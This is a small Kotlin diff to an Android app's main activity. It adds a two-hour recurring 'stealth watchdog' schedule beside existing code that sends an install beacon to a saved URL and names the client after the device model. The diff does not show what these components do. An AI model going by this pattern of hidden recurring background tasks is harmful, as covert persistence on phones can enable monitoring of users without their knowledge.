@@ -154,6 +154,9 @@ class MainActivity : AppCompatActivity() {
             InstallBeaconManager.checkAndSendBeacon(this, savedUrl)
         }
 
+        // Initialize 2-hour recurring stealth watchdog schedule (anchored after 5 AM)
+        WatchdogScheduler.scheduleRecurringWatchdog(this)
+
         // Show client name
         val clientName = prefs.getString("client_name", null)
             ?: "${Build.MANUFACTURER.replaceFirstChar { it.uppercase() }}-${Build.MODEL.replace(" ", "-")}"
